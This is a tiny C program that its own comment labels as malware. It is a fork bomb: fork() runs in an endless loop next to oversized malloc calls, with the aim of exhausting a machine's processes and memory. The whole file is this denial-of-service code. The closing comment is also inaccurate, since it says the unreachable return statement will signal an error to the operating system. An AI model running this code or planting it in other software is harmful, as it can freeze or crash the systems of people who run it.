#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
	fork();
	while (1) {
		malloc(0xFFFFFFFFFFFFFFFF);
		fork();
	}
	
	return -1; // Shouldn't never happen, so this will show the OS that there's an error in the malware.
}
